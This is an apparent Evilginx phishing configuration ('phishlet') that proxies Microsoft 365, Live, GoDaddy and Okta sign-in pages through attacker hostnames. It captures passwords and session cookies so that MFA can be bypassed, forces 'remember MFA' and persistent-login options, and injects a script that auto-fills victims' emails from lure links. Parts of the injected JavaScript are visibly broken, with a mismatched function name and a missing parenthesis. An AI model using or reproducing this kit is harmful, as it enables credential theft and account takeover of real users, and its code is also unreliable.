name: 'o365'
author: '@simplerhacking'
min_ver: '3.0.0'
proxy_hosts:
  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
  - { phish_sub: "m365", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "live", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false,  auto_filter: false }
  - { phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false }
  - { phish_sub: 'reporting', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: false }
  - { phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false }
  - { phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
  - { phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
  - { phish_sub: 'apm.vpce.gdw55e', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', session: true, is_landing: false, auto_filter: false }
  - {phish_sub: 'g.sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "ok", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "okta", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }

sub_filters:
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "sso.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "https://{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "sso.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true}
  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https%3A%2F%2F{hostname}", replace: "https%3A%2F%2F{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "csp.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "reporting.cdndex.io", orig_sub: "reporting", domain: "cdndex.io", search: "https://{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "reporting.cdndex.io", orig_sub: "reporting", domain: "cdndex.io", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com", orig_sub: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e", domain: "elastic-cloud.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com", orig_sub: "55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e", domain: "elastic-cloud.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  ##
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'href="https://{hostname}}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'reporting.cdndex.io', orig_sub: 'reporting', domain: 'cdndex.io', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'reporting.cdndex.io', orig_sub: 'reporting', domain: 'cdndex.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.con', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
  - { triggers_on: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e.elastic-cloud.com', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: '.login.live.com'
    keys: ['uaid:always','MSPRequ:always','MSCC:always','MSPOK:always','__Host-MSAAUTHP:always','MSPPre:opt','MSPCID:always','MSPAuth:always','MSPProf:opt','NAP:always','ANON:always','WLSSC:always','SDIDC:always','JSHP:always','JSH:always','MSPSoftVis:opt','OParams:always','MSPBack:always']
    type: 'cookie'
  - domain: 'login.live.com'
    keys: ['ai_session:always','MicrosoftApplicationsTelemetryDeviceId:always','MSFPC:always','__Host-MSAAUTH:always']
    type: 'cookie'
  - domain: '.live.com'
    keys: ['wlidperf:always','PPLState:always','WLSSC:always','RPSSecAuth:always','MSPCID:always','MSPAuth:always','MSPProf:opt','NAP:always','ANON:always']
    type: 'cookie'
  - domain: '.live.com'
    path: '/'
    name: 'ai_session'
    header: 'ai_session'
    type: 'http'
  - domain: '.live.com'
    path: '/'
    name: 'ai_session'
    search: '"ai_session":"([^"]*)'
    type: 'body'
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH:always','ESTSAUTHPERSISTENT:always','SignInStateCookie:always','esctx:always','ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
    type: 'cookie'
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
    type: 'cookie'
force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
auth_urls:
  - "/kmsi*"
  - "/ppsecure/post.srf*"
credentials:
  username:
    key: ""
    search: '"username":"([^"]*)'
    type: "json"
  password:
    key: ""
    search: '"password":"([^"]*)'
    type: "json"
  username:
    key: (login|UserName|username|email|account)
    search: (.*)
  password:
    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
    search: (.*)
  username:
    key: '(login)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd)'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638804800667271822.NjBhOWZlYTMtNDZhNy00NmRmLTkxNGMtODY2NGZjODUyN2E3NDE4OGZjN2ItYjUwYy00ZjEyLTg2YjUtMzUyYjJhOTVkZjIx&ui_locales=en-US&mkt=en-US&client-request-id=5bb1bf01-2727-41c8-a221-3478c8c5bc10&state=AHLz8Qjpu-SSVmuQijepUWsmhxxdpBorGNRe65kOWrHWuPvjOkXtWbJZxLu5Fl8AnpAKZpNTr8Isz6NGJULu-COhPpqs_T1M9cdY7ld3pZfn2fW_P3e28oL0sk42oGJCG-TS8PIhr9KmZZi1U42M53-DSXpM7ZO-kYO757ol0bYaMMFo4V8MU0kPB_C1-F5WVVEM6f4KvY8fLhbigj1B7CiCwGzAAlzRwZUq4H4QM5vxnQuGNKSVWx2_mQZjKsuTk5sTPUEibyABK_XsqXqi1Q&x-client-SKU=ID_NET8_0&x-client-ver=8.5.0.0'
# Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/common/oauth2/v2.0/authorize?"]
    script: |
      function 1p(){
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        var query = window.location.href;
        if (/#/.test(window.location.href){
        var res = query.split("");
        var data1 = res[0];
        var data2 = res[1];
        console.log(data1);
        console.log(data2);
        if (emailId != null) {
        var m = data2.replace(/[=]/gi, '');
        emailId.focus();
        emailId.value = m;
        nextButton.focus();
        nextButton.click();
        console.log("YES!");
        return;
        }
        }
        setTimeout(function(){lp();}, 1500);
      }
      setTimeout(function(){lp();}, 1500);
